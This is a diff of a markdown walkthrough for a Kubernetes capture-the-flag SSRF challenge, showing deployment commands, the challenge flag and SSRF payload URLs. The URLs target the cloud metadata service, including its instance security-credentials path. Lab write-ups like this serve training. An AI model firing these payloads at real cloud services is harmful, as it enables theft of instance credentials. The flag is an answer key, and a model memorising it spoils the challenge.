@@ -1,4 +1,4 @@
-### Challenge 18 - Exploiting SSRF in K8
+# Challenge 18 - K8 Security - SSRF on K8
 
 **Challenge Type:** Breaker
 
@@ -24,30 +24,34 @@ kubectl apply -f challenge18/deployment_starwars_ssrf.yaml
 Get endpoint of the Service
 
 ```json
+//get LB address
 kubectl get svc
 ```
 
 ```json
+//SSRF Payload
+
 http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
 ```
 
-![[Pasted image 20220309223300.png]]
+![ssrf1](/screenshots/Pasted%20image%2020220309223300.png)
 
-![[Pasted image 20220309223316.png]]
+![ssrf2](/screenshots/Pasted%20image%2020220309223316.png)
 
-![[Pasted image 20220309223347.png]]
+![ssrf3](/screenshots/Pasted%20image%2020220309223347.png)
 
-   [http://169.254.169.254/latest/meta-data/ami-id](http://169.254.169.254/latest/meta-data/ami-id)
+```json
+//Payload to pull AMI ID
+http://169.254.169.254/latest/meta-data/ami-id
+```
 
-![[Pasted image 20220309223410.png]]
-
+![ssrf4](/screenshots/Pasted%20image%2020220309223410.png)
 
 > 🏁 Challenge 18 Flag - `k8_ctf{ami-0d70c56e5780922bf}`
 
 
 
-clean up
-
-```
+```json
+//clean up
 kubectl delete -f challenge18/deployment_starwars_ssrf.yaml
 ```
